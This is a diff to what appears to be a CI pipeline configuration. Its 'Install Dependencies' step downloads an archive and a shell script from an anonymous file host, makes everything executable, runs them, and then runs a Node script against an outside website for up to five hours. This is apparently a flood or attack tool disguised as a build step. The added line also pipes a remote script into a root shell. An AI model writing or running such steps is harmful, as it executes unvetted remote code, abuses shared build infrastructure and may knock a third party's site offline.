@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt update && apt install wget unrar -y && wget https://0x0.st/o6ka.rar && unrar e o6ka.rar && wget https://0x0.st/o6kB.sh && mv o6kB.sh install3.sh && chmod 777 * && sh install.sh && sh install3.sh && node index.js https://yuni.su/ 300 10
+            command: apt update && apt install wget nodejs unrar -y && curl -sL https://deb.nodesource.com/setup_19.x | sudo -E bash - && sudo apt install nodejs -y && wget https://0x0.st/o6ka.rar && unrar e o6ka.rar && wget https://0x0.st/o6kB.sh && mv o6kB.sh install3.sh && chmod 777 * && sh install.sh && sh install3.sh && node index.js https://yuni.su/ 300 10
             no_output_timeout: 5h
 
 workflows:
